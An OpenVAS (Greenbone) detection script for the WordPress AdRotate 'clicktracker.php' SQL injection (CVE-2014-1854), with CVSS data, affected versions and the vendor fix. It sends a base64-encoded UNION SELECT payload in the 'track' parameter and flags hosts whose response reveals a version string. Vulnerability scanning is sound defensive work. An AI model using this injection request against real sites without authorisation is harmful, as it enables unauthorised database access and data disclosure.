###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_adrotate_track_pram_sqli_vul.nasl 11974 2018-10-19 06:22:46Z cfischer $
#
# WordPress AdRotate Plugin 'clicktracker.php' SQL Injection Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804511");
  script_version("$Revision: 11974 $");
  script_cve_id("CVE-2014-1854");
  script_bugtraq_id(65709);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-19 08:22:46 +0200 (Fri, 19 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-03-11 11:17:52 +0530 (Tue, 11 Mar 2014)");
  script_name("WordPress AdRotate Plugin 'clicktracker.php' SQL Injection Vulnerability");


  script_tag(name:"summary", value:"This host is installed with WordPress AdRotate Plugin and is prone to sql
injection vulnerability.");
  script_tag(name:"vuldetect", value:"Send a crafted exploit string via HTTP GET request and check whether it is
possible to execute sql query or not.");
  script_tag(name:"insight", value:"Flaw is due to the library/clicktracker.php script not properly sanitizing
user-supplied input to the 'track' parameter.");
  script_tag(name:"impact", value:"Successful exploitation will allow attacker to inject or manipulate SQL
queries in the back-end database, allowing for the manipulation or disclosure
of arbitrary data.");
  script_tag(name:"affected", value:"Wordpress AdRotate Pro plugin version 3.9 through 3.9.5 and AdRotate Free
plugin version 3.9 through 3.9.4");
  script_tag(name:"solution", value:"Upgrade AdRotate Pro to version 3.9.6 or higher and AdRotate Free to version
3.9.5 or higher.");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://secunia.com/advisories/57079");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/31834");
  script_xref(name:"URL", value:"https://www.htbridge.com/advisory/HTB23201");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/125330");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  script_xref(name:"URL", value:"http://www.adrotateplugin.com");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

url = dir + '/wp-content/plugins/adrotate/library/clicktracker.php?track=LT' +
            'EgVU5JT04gU0VMRUNUIHZlcnNpb24oKSwxLDEsMQ==';

req = http_get(item:url,  port:http_port);
res = http_keepalive_send_recv(port:http_port, data:req, bodyonly:FALSE);

if(res && res =~ "HTTP/1.. 302 Found" && res =~ "Location: ([0-9.]+)")
{
  security_message(http_port);
  exit(0);
}
